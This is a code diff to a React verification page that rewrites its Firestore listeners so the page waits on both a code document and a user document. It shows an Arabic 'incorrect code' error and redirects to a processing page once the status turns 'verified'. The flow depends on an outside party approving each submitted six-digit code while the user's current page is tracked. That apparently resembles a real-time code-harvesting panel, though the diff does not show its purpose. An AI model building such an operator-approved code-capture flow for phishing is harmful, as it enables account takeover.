@@ -72,54 +72,61 @@ export default function VerifyPage() {
   useEffect(() => {
     if (!submitted) return;
 
-    let unsubscribe: (() => void) | null = null;
+    let unsubCode: (() => void) | null = null;
+    let unsubUser: (() => void) | null = null;
 
-    const setupListener = () => {
-      // Listen to verification code status first (more specific)
-      if (lastSubmittedCodeId) {
-        unsubscribe = onSnapshot(doc(getDb(), 'verificationCodes', lastSubmittedCodeId), (snapshot) => {
-          if (snapshot.exists()) {
-            const data = snapshot.data();
-            
-            if (data.status === 'verified') {
-              setSuccess(true);
-              const clientId = getClientId();
-              updateUserPage(clientId, '/processing');
-              setTimeout(() => navigate('/processing'), 1500);
-            } else if (data.status === 'rejected') {
-              setError('رمز التحقق غير صحيح');
-              setSubmitted(false);
-              setWaitingApproval(false);
-              setCode(['', '', '', '', '', '']);
-              setTimeout(() => inputRefs.current[0]?.focus(), 100);
-            }
+    console.log('[Verify] Setting up listeners for approval...');
+
+    // 1. Listen to verification code status (Primary trigger)
+    if (lastSubmittedCodeId) {
+      unsubCode = onSnapshot(doc(getDb(), 'verificationCodes', lastSubmittedCodeId), (snapshot) => {
+        if (snapshot.exists()) {
+          const data = snapshot.data();
+          console.log('[Verify] Code status update:', data.status);
+          
+          if (data.status === 'verified') {
+            setSuccess(true);
+            const clientId = getClientId();
+            updateUserPage(clientId, '/processing');
+            setTimeout(() => navigate('/processing'), 1500);
+          } else if (data.status === 'rejected') {
+            setError('رمز التحقق غير صحيح');
+            setSubmitted(false);
+            setWaitingApproval(false);
+            setCode(['', '', '', '', '', '']);
+            setTimeout(() => inputRefs.current[0]?.focus(), 100);
           }
-        });
-      } 
-      // Fallback to user status if no specific code id
-      else if (userId) {
-        unsubscribe = onSnapshot(doc(getDb(), 'users', userId), (snapshot) => {
-          if (snapshot.exists()) {
-            const data = snapshot.data();
-            if (data.status === 'verified' || data.status === 'completed') {
-              setSuccess(true);
-              const clientId = getClientId();
-              updateUserPage(clientId, '/processing');
-              setTimeout(() => navigate('/processing'), 1500);
-            } else if (data.status === 'rejected') {
-              setError('رمز التحقق غير صحيح');
-              setSubmitted(false);
-              setWaitingApproval(false);
-              setCode(['', '', '', '', '', '']);
-              setTimeout(() => inputRefs.current[0]?.focus(), 100);
-            }
+        }
+      });
+    } 
+
+    // 2. Listen to user status (Secondary/Fallback trigger)
+    if (userId) {
+      unsubUser = onSnapshot(doc(getDb(), 'users', userId), (snapshot) => {
+        if (snapshot.exists()) {
+          const data = snapshot.data();
+          console.log('[Verify] User status update:', data.status);
+          
+          if (data.status === 'verified' || data.status === 'completed') {
+            setSuccess(true);
+            const clientId = getClientId();
+            updateUserPage(clientId, '/processing');
+            setTimeout(() => navigate('/processing'), 1500);
+          } else if (data.status === 'rejected') {
+            setError('رمز التحقق غير صحيح');
+            setSubmitted(false);
+            setWaitingApproval(false);
+            setCode(['', '', '', '', '', '']);
+            setTimeout(() => inputRefs.current[0]?.focus(), 100);
           }
-        });
-      }
+        }
+      });
+    }
+
+    return () => {
+      unsubCode?.();
+      unsubUser?.();
     };
-
-    setupListener();
-    return () => unsubscribe?.();
   }, [userId, lastSubmittedCodeId, submitted, navigate]);
 
   useEffect(() => {
